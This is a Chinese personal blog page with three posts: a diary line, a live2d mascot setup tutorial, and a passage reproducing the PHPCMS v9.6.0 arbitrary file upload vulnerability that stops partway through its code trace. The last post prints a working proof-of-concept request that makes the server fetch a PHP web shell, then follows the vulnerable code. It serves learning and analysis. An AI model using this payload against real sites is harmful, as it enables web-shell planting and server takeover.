<!DOCTYPE html>












  


<html class="theme-next muse use-motion" lang="">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">






















<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">

<link rel="stylesheet" href="/css/main.css?v=7.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">


  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '7.2.0',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
    copycode: {"enable":false,"show_result":false,"style":null},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    translation: {
      copy_button: 'Kopieren',
      copy_success: 'Kopiert',
      copy_failure: 'Kopieren fehlgeschlagen'
    }
  };
</script>

  <meta name="keywords" content="root">
<meta property="og:type" content="website">
<meta property="og:title" content="The clown is laughing at you">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="The clown is laughing at you">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="The clown is laughing at you">





  
  
  <link rel="canonical" href="http://yoursite.com/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  
  <title>The clown is laughing at you</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">The clown is laughing at you</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Navigationsleiste an/ausschalten">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home menu-item-active">

    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>

  </li>

      
      
    </ul>
  

  
    

  

  
</nav>



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/20/Solider/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cookie">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The clown is laughing at you">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/07/20/Solider/" class="post-title-link" itemprop="url">Solider</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2019-07-20 18:06:24 / Geändert am: 18:07:30" itemprop="dateCreated datePublished" datetime="2019-07-20T18:06:24+08:00">2019-07-20</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>today is a solider</p>
<p>今天偷的懒，都是给未来挖的坑。</p>
<p>学习频率不够，加把劲….</p>

          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/20/博客中填加live2d卡通人物/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cookie">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The clown is laughing at you">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/07/20/博客中填加live2d卡通人物/" class="post-title-link" itemprop="url">博客中添加看板娘</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2019-07-20 16:27:33 / Geändert am: 19:47:15" itemprop="dateCreated datePublished" datetime="2019-07-20T16:27:33+08:00">2019-07-20</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>下午逛别人的博客的时候，看到别人在博客里右下角出现了血小板<br><img src="/2019/07/20/博客中填加live2d卡通人物/1.png" alt=""><br>天啊，又能动又能跳，超级可爱……..我这个宅男顶不住了，就百度看看这是怎么做到的,分享一下</p>
<h1 id="开始变态"><a href="#开始变态" class="headerlink" title="开始变态"></a>开始变态</h1><p>安装使用live2d技术</p>
<p>首先检查博客主目录下面的  package.json里是否有<strong>“hexo-helper-live2d”</strong>依赖，有的话可以先卸载<br>使用命令：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall hexo-helper-live2d</span><br></pre></td></tr></table></figure></p>
<p>之后再安装：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure></p>
<p>查看package.json，看看是否有hexo-helper-live2d…的字段，有的话就成功了。</p>
<p>然后去下载模块，模块我上传到我的网盘，需要的人自行下载….<a href="https://pan.baidu.com/s/1o8zr97DZAk3PFmYC9kq2Nw" target="_blank" rel="noopener">都懂</a><br>提取码是：<strong>U2FsdGVkX18Jq/wMkBOLrKdH5xCooGVRY1AZayh9sLM=</strong>(giao)<br><img src="/2019/07/20/博客中填加live2d卡通人物/2.png" alt=""></p>
<p>然后把这些文件复制到blogs\node_modules文件夹下，配置博客站点配置文件<strong>_config.yml</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">live2d:</span><br><span class="line">  enable: <span class="keyword">true</span></span><br><span class="line">  pluginModelPath: assets/</span><br><span class="line">  model:</span><br><span class="line">    <span class="keyword">use</span>: <span class="title">live2d</span>-<span class="title">widget</span>-<span class="title">model</span>-<span class="title">haruto</span>  #模板目录，在<span class="title">node_modules</span>里</span><br><span class="line">  <span class="title">display</span>:</span><br><span class="line">    <span class="title">position</span>: <span class="title">right</span></span><br><span class="line">    <span class="title">width</span>: 150 </span><br><span class="line">    <span class="title">height</span>: 300</span><br><span class="line">  <span class="title">mobile</span>:</span><br><span class="line">    <span class="title">show</span>: <span class="title">false</span>  #是否在手机进行显示</span><br></pre></td></tr></table></figure></p>
<p>写到文件里，然后hexo clean 一下<br>hexo s 查看就有了…..</p>
<h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p><img src="/2019/07/20/博客中填加live2d卡通人物/4.png" alt=""></p>

          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/19/phpcmsv9文件上传漏洞-复现/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cookie">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The clown is laughing at you">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/07/19/phpcmsv9文件上传漏洞-复现/" class="post-title-link" itemprop="url">phpcmsv9文件上传漏洞[复现]</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2019-07-19 22:47:17" itemprop="dateCreated datePublished" datetime="2019-07-19T22:47:17+08:00">2019-07-19</time>
            </span>
          

          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Bearbeitet am</span>
                
                <time title="Geändert am: 2019-07-20 19:52:18" itemprop="dateModified" datetime="2019-07-20T19:52:18+08:00">2019-07-20</time>
              </span>
            
          

          

          
            
            
          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>phpcmsv9.6.0<br>ubuntu19<br>mysql+php5.6</p>
<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这两天在家里，状态特别不好，因为家里的网速差，上个网都慢的要死，所以整的我整个人都十分的郁闷<br>然后提前溜回学校吧，还是实验室好啊，今天尝试复现phpcmsv9.6中的任意文件上传漏洞，在复现的过程中，看完POC后，自己尝试寻找触发点，其间意识到debug的重要性，然后差不多一个下午都在试着使用debug，然后绕了不少弯路，现在还在学习使用，这次的复现，debug起到至关重要的作用。<br>然后有一个要命的地方，函数的操作和数据库之间的联系，我发现我没有很好的联系在一起。</p>
<h1 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h1><p>由于过滤的不当，使得文件可以绕过后缀限制，实现文件上传。</p>
<h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><h2 id="触发点追溯"><a href="#触发点追溯" class="headerlink" title="触发点追溯"></a>触发点追溯</h2><p>路由就不介绍了…..<br>看过POC，其中payload为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?m=member&amp;c=index&amp;a=register&amp;siteid=<span class="number">1</span></span><br><span class="line">POST:siteid=<span class="number">1</span>&amp;modelid=<span class="number">11</span>&amp;username=<span class="number">123456</span>&amp;password=<span class="number">123456</span>&amp;email=<span class="number">123456</span>@qq.com&amp;info[content]=&lt;img src=http:<span class="comment">//127.0.0.1/shell.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</span></span><br></pre></td></tr></table></figure></p>
<p>根据地址，问题出在phpcms/modules/member/index.php::register()<br>找到它的位置….<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_session_start();</span><br><span class="line">		<span class="comment">//获取用户siteid</span></span><br><span class="line">		$siteid = <span class="keyword">isset</span>($_REQUEST[<span class="string">'siteid'</span>]) &amp;&amp; trim($_REQUEST[<span class="string">'siteid'</span>]) ? intval($_REQUEST[<span class="string">'siteid'</span>]) : <span class="number">1</span>;</span><br><span class="line">		<span class="comment">//定义站点id常量</span></span><br><span class="line">		<span class="keyword">if</span> (!defined(<span class="string">'SITEID'</span>)) &#123;</span><br><span class="line">		   define(<span class="string">'SITEID'</span>, $siteid);</span><br><span class="line">		&#125;</span><br><span class="line">		... ...</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'dosubmit'</span>])) &#123;</span><br><span class="line">			<span class="keyword">if</span>($member_setting[<span class="string">'enablcodecheck'</span>]==<span class="string">'1'</span>)&#123;<span class="comment">//开启验证码</span></span><br><span class="line">				<span class="keyword">if</span> ((<span class="keyword">empty</span>($_SESSION[<span class="string">'connectid'</span>]) &amp;&amp; $_SESSION[<span class="string">'code'</span>] != strtolower($_POST[<span class="string">'code'</span>]) &amp;&amp; $_POST[<span class="string">'code'</span>]!==<span class="keyword">NULL</span>) || <span class="keyword">empty</span>($_SESSION[<span class="string">'code'</span>])) &#123;</span><br><span class="line">					showmessage(L(<span class="string">'code_error'</span>));</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					$_SESSION[<span class="string">'code'</span>] = <span class="string">''</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			$userinfo = <span class="keyword">array</span>();</span><br><span class="line">			$userinfo[<span class="string">'encrypt'</span>] = create_randomstr(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">			$userinfo[<span class="string">'username'</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; is_username($_POST[<span class="string">'username'</span>])) ? $_POST[<span class="string">'username'</span>] : <span class="keyword">exit</span>(<span class="string">'0'</span>);</span><br><span class="line">			$userinfo[<span class="string">'nickname'</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">'nickname'</span>]) &amp;&amp; is_username($_POST[<span class="string">'nickname'</span>])) ? $_POST[<span class="string">'nickname'</span>] : <span class="string">''</span>;</span><br><span class="line">			</span><br><span class="line">			$userinfo[<span class="string">'email'</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">'email'</span>]) &amp;&amp; is_email($_POST[<span class="string">'email'</span>])) ? $_POST[<span class="string">'email'</span>] : <span class="keyword">exit</span>(<span class="string">'0'</span>);</span><br><span class="line">			$userinfo[<span class="string">'password'</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) &amp;&amp; is_badword($_POST[<span class="string">'password'</span>])==<span class="keyword">false</span>) ? $_POST[<span class="string">'password'</span>] : <span class="keyword">exit</span>(<span class="string">'0'</span>);</span><br><span class="line">			</span><br><span class="line">			$userinfo[<span class="string">'email'</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">'email'</span>]) &amp;&amp; is_email($_POST[<span class="string">'email'</span>])) ? $_POST[<span class="string">'email'</span>] : <span class="keyword">exit</span>(<span class="string">'0'</span>);</span><br><span class="line"></span><br><span class="line">			$userinfo[<span class="string">'modelid'</span>] = <span class="keyword">isset</span>($_POST[<span class="string">'modelid'</span>]) ? intval($_POST[<span class="string">'modelid'</span>]) : <span class="number">10</span>;</span><br><span class="line">			$userinfo[<span class="string">'regip'</span>] = ip();</span><br><span class="line">			$userinfo[<span class="string">'point'</span>] = $member_setting[<span class="string">'defualtpoint'</span>] ? $member_setting[<span class="string">'defualtpoint'</span>] : <span class="number">0</span>;</span><br><span class="line">			$userinfo[<span class="string">'amount'</span>] = $member_setting[<span class="string">'defualtamount'</span>] ? $member_setting[<span class="string">'defualtamount'</span>] : <span class="number">0</span>;</span><br><span class="line">			$userinfo[<span class="string">'regdate'</span>] = $userinfo[<span class="string">'lastdate'</span>] = SYS_TIME;</span><br><span class="line">			$userinfo[<span class="string">'siteid'</span>] = $siteid;</span><br><span class="line">			$userinfo[<span class="string">'connectid'</span>] = <span class="keyword">isset</span>($_SESSION[<span class="string">'connectid'</span>]) ? $_SESSION[<span class="string">'connectid'</span>] : <span class="string">''</span>;</span><br><span class="line">			$userinfo[<span class="string">'from'</span>] = <span class="keyword">isset</span>($_SESSION[<span class="string">'from'</span>]) ? $_SESSION[<span class="string">'from'</span>] : <span class="string">''</span>;</span><br><span class="line">			<span class="comment">//手机强制验证</span></span><br><span class="line">            ... ...</span><br><span class="line">            ... ...</span><br><span class="line">            	<span class="keyword">if</span>($member_setting[<span class="string">'choosemodel'</span>]) &#123;</span><br><span class="line">				<span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_input.class.php'</span>;</span><br><span class="line">		        <span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_update.class.php'</span>;</span><br><span class="line">				$member_input = <span class="keyword">new</span> member_input($userinfo[<span class="string">'modelid'</span>]);		</span><br><span class="line">				$_POST[<span class="string">'info'</span>] = array_map(<span class="string">'new_html_special_chars'</span>,$_POST[<span class="string">'info'</span>]);</span><br><span class="line">				$user_model_info = $member_input-&gt;get($_POST[<span class="string">'info'</span>]);				        				</span><br><span class="line">			&#125;</span><br><span class="line">            ... ...</span><br><span class="line">            ... ...</span><br></pre></td></tr></table></figure></p>
<p>中间的代码太长了，自行看源码吧….其间的很多代码是一个验证的过程，根据传入参数的需要，其实和本漏洞都没有太大的关系，通过debug可以很快速的过掉这些无用代码….话是这么说，但是我debug并没有用的特别熟练。<br>还是像之前那样，先看看构造函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">parent</span>::__construct();</span><br><span class="line">		<span class="keyword">$this</span>-&gt;http_user_agent = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个发现好像没啥问题，就是继承了父类，直接看该函数，先对siteid和dosubmit进行验证，然后我们输入用户信息，实际上通过浏览器访问该地址实际上就就是一个注册过程。(这里插一句，就是在分析的过程中可能会遇到函数不懂作用的,然后一路手动跟着跑，跑到最后，看到懵逼的那种….所以我们要善于使用debug,一些不懂如何使用的函数，可以借助debug)<br>关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user_model_info = $member_input-&gt;get($_POST[<span class="string">'info'</span>]);</span><br></pre></td></tr></table></figure></p>
<p>跟进函数get()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($data)</span> </span>&#123;<span class="comment">//$_POST['info']</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;data = $data = trim_script($data);</span><br><span class="line">		$model_cache = getcache(<span class="string">'member_model'</span>, <span class="string">'commons'</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db_pre.$model_cache[<span class="keyword">$this</span>-&gt;modelid][<span class="string">'tablename'</span>];</span><br><span class="line"></span><br><span class="line">		$info = <span class="keyword">array</span>();</span><br><span class="line">		$debar_filed = <span class="keyword">array</span>(<span class="string">'catid'</span>,<span class="string">'title'</span>,<span class="string">'style'</span>,<span class="string">'thumb'</span>,<span class="string">'status'</span>,<span class="string">'islink'</span>,<span class="string">'description'</span>);</span><br><span class="line">		<span class="keyword">if</span>(is_array($data)) &#123;</span><br><span class="line">			<span class="keyword">foreach</span>($data <span class="keyword">as</span> $field=&gt;$value) &#123;</span><br><span class="line">				<span class="keyword">if</span>($data[<span class="string">'islink'</span>]==<span class="number">1</span> &amp;&amp; !in_array($field,$debar_filed)) <span class="keyword">continue</span>;</span><br><span class="line">				$field = safe_replace($field);</span><br><span class="line">				$name = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'name'</span>];</span><br><span class="line">				$minlength = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'minlength'</span>];</span><br><span class="line">				$maxlength = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'maxlength'</span>];</span><br><span class="line">				$pattern = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'pattern'</span>];</span><br><span class="line">				$errortips = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'errortips'</span>];</span><br><span class="line">				<span class="keyword">if</span>(<span class="keyword">empty</span>($errortips)) $errortips = <span class="string">"$name 不符合要求！"</span>;</span><br><span class="line">				$length = <span class="keyword">empty</span>($value) ? <span class="number">0</span> : strlen($value);</span><br><span class="line">				<span class="keyword">if</span>($minlength &amp;&amp; $length &lt; $minlength &amp;&amp; !$isimport) showmessage(<span class="string">"$name 不得少于 $minlength 个字符！"</span>);</span><br><span class="line">				<span class="keyword">if</span> (!array_key_exists($field, <span class="keyword">$this</span>-&gt;fields)) showmessage(<span class="string">'模型中不存在'</span>.$field.<span class="string">'字段'</span>);</span><br><span class="line">				<span class="keyword">if</span>($maxlength &amp;&amp; $length &gt; $maxlength &amp;&amp; !$isimport) &#123;</span><br><span class="line">					showmessage(<span class="string">"$name 不得超过 $maxlength 个字符！"</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					str_cut($value, $maxlength);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span>($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips);</span><br><span class="line">	            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'isunique'</span>] &amp;&amp; <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>($field=&gt;$value),$field) &amp;&amp; ROUTE_A != <span class="string">'edit'</span>) showmessage(<span class="string">"$name 的值不得重复！"</span>);</span><br><span class="line">				$func = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'formtype'</span>];</span><br><span class="line">				<span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, $func)) $value = <span class="keyword">$this</span>-&gt;$func($field, $value);</span><br><span class="line">	</span><br><span class="line">				$info[$field] = $value;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $info;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>先不考虑过滤的问题先找到是什么触发了漏洞（主要是考虑到过滤的问题，我发现我巨菜…..）<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, $func)) $value = <span class="keyword">$this</span>-&gt;$func($field, $value);</span><br></pre></td></tr></table></figure></p>
<p>这里的$func在debug下，会跳转到editor()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">editor</span><span class="params">($field, $value)</span> </span>&#123;</span><br><span class="line">	$setting = string2array(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'setting'</span>]);</span><br><span class="line">	$enablesaveimage = $setting[<span class="string">'enablesaveimage'</span>];</span><br><span class="line">	$site_setting = string2array(<span class="keyword">$this</span>-&gt;site_config[<span class="string">'setting'</span>]);</span><br><span class="line">	$watermark_enable = intval($site_setting[<span class="string">'watermark_enable'</span>]);</span><br><span class="line">	$value = <span class="keyword">$this</span>-&gt;attachment-&gt;download(<span class="string">'content'</span>, $value,$watermark_enable);</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>一看到download()毫不犹豫的跟进download()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;upload_func = <span class="string">'copy'</span>;</span><br><span class="line">   ... ...</span><br><span class="line">   ... ...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($field, $value,$watermark = <span class="string">'0'</span>,$ext = <span class="string">'gif|jpg|jpeg|bmp|png'</span>, $absurl = <span class="string">''</span>, $basehref = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $image_d;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;att_db = pc_base::load_model(<span class="string">'attachment_model'</span>);</span><br><span class="line">	$upload_url = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_url'</span>);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;field 